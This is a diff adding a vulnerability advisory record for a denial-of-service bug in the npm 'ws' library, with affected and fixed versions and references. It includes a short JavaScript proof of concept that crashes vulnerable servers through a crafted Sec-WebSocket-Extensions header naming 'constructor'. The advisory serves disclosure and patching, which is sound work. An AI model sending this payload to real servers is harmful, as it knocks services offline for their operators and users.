@@ -1,0 +1,67 @@
+advisory_id: npm/ws/GMS-2019-145
+datasource_id: gitlab_importer_v2/npm/ws/GMS-2019-145
+datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/npm/ws/GMS-2019-145.yml
+aliases:
+  - GHSA-5v72-xg48-5rpm
+  - GMS-2019-145
+summary: |
+  Denial of Service in ws
+  Affected versions of `ws` can crash when a specially crafted `Sec-WebSocket-Extensions` header containing `Object.prototype` property names as extension or parameter names is sent.
+
+  ## Proof of concept
+
+  ```
+  const WebSocket = require('ws');
+  const net = require('net');
+
+  const wss = new WebSocket.Server({ port: 3000 }, function () {
+    const payload = 'constructor';  // or ',;constructor'
+
+    const request = [
+      'GET / HTTP/1.1',
+      'Connection: Upgrade',
+      'Sec-WebSocket-Key: test',
+      'Sec-WebSocket-Version: 8',
+      `Sec-WebSocket-Extensions: ${payload}`,
+      'Upgrade: websocket',
+      '\r'
+    ].join('\r');
+
+    const socket = net.connect(3000, function () {
+      socket.resume();
+      socket.write(request);
+    });
+  });
+  ```
+
+
+  ## Recommendation
+
+  Update to version 3.3.1 or later.
+impacted_packages:
+  - purl: pkg:npm/ws
+    affected_versions: vers:npm/>=0.2.6|<1.1.5|>=2.0.0|<3.3.1
+    fixed_versions: vers:npm/1.1.5|3.3.1
+severities: []
+weaknesses:
+  - CWE-1035
+  - CWE-937
+references:
+  - url: https://github.com/websockets/ws/commit/c4fe46608acd61fbf7397eadc47378903f95b78a
+    reference_type:
+    reference_id:
+  - url: https://nodesecurity.io/advisories/550
+    reference_type:
+    reference_id:
+  - url: https://snyk.io/vuln/npm:ws:20171108
+    reference_type:
+    reference_id:
+  - url: https://www.npmjs.com/advisories/550
+    reference_type:
+    reference_id:
+  - url: https://www.npmjs.com/advisories/550/versions
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-5v72-xg48-5rpm
+    reference_type:
+    reference_id: GHSA-5v72-xg48-5rpm
